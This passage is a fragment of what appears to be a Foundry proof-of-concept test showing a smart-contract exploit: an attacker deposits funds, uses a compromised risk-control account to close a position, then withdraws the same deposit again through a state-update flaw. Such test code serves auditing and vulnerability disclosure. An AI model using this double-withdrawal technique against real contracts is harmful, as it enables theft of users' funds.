        victim.deposit(depositAmount);

        // Step 2: The riskControl account (which we now control) closes the position.
        vm.startPrank(riskControl);
        victim.closePosition(attacker);
        vm.stopPrank();

        // Step 3: Attacker withdraws the funds again due to the state update flaw.
        victim.withdraw(depositAmount);
